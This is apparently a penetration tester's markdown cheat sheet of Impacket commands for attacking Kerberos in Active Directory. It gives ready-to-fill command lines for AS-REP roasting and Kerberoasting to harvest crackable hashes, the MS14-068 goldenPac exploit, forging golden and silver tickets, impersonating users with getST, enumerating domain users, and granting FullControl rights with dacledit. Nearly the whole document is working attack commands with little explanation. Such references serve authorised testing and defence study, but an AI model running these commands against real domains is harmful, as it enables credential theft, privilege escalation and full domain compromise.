# kerberos

#impacket
## GetNPUsers without password to get TGT (kerberoast.oasting)
```
GetNPUsers.py <domain>/<user> -no-pass -request -format hashcat -outputfile <outputfile|asrep.hashes>

```

## GetNPUsers - attempt to list and get TGTs for those users that have the property ‘Do not require Kerberos preauthentication’ (kerberoast.oasting)
```
GetNPUsers.py -dc-ip <dc_ip> <domain>/ -usersfile <users_file|users.txt> -format hashcat -outputfile <outputfile|asrep.hashes>
```

## GetUSERSPN - find Service Principal Names that are associated with a normal user account (kerberoasting)
```
GetUserSPNs.py -request -dc-ip <dc_ip> <domain>/<user>:<password>
```

## GetUSERSPN - no preauth kerberoast
```
GetUserSPNs.py -request -dc-ip <dc_ip> <domain>/ -no-preauth <user> -usersfile <spnfile|users.txt> -outputfile <outputfile|kerberoast.hashes>
```

## MS14-068 - goldenPac
```
goldenPac.py -dc-ip <dc_ip> <domain>/<user>:<password>@<target>
```

## Ticketer - (golden ticket) - generate TGT/TGS tickets into ccache format which can be converted further into kirbi.
```
ticketer.py -nthash <nthash> -domain-sid <domain_sid> -domain <domain> <user>
```

## Ticketer - (silver ticket) - generate TGS tickets into ccache format which can be converted further into kirbi.
```
ticketer.py -nthash <nthash> -domain-sid <domain_sid> -domain <domain> -spn <SPN> <user>
```

## TicketConverter - convert kirbi files (commonly used by mimikatz) into ccache files used by impacket
```
ticketConverter.py <ccache_ticket_file> <ticket_kirbi_file>
```

## Silver ticket - impersonate user
```
getST.py -spn <service>/<target> <domain>/<user>:<password> -k -impersonate <target_user>
```

## GetTGT - request a TGT and save it as ccache for given a password, hash or aesKey
```
getTGT.py -dc-ip <dc_ip> <domain>/<user>:<password> 
```

## GetADUser - gather data about the domain’s users and their corresponding email addresses
```
GetADUsers.py -all <domain>/<user>:<password> -dc-ip <dc_ip>
```

## dacledit.py - set dacl on target  
```
dacledit.py -action <action|write> -rights "<rights|FullControl>" -principal "<principal|$USER>" -target-dn "<target-dn>" "<domain>/<user>:<password>" <inheritance|-inheritance>
```
